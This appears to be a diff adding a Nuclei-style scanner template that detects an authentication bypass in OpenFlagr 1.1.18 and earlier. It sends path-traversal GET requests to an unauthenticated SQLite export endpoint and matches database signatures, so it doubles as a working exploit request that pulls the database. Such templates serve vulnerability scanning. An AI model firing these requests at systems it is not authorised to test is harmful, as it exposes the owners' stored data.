@@ -1,0 +1,43 @@
+id: openflagr-auth-bypass
+
+info:
+  name: 0day speedrun? OpenFlagr <= 1.1.18 Authentication Bypass
+  author: reewardius
+  severity: high
+  description: |
+    Detects exposure of SQLite database schema through an export endpoint.
+    The endpoint returns the complete database schema including table structures,
+    indexes, and constraints, which could aid attackers in understanding the
+    application's data model and planning further attacks.
+  reference:
+    - https://dreyand.rs/code%20review/golang/2026/01/03/0day-speedrun-openflagr-less-1118-authentication-bypass
+  metadata:
+    max-request: 1
+  tags: cve
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/health/../export/sqlite"
+      - "{{BaseURL}}/api/v1/flags/../export/sqlite"
+      - "{{BaseURL}}/api/v1/evaluation/../export/sqlite"
+      
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SQLite format 3"
+          - "CREATE TABLE"
+          - "CREATE INDEX"
+          
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+          - "application/x-sqlite3"
+          
+      - type: status
+        status:
+          - 200
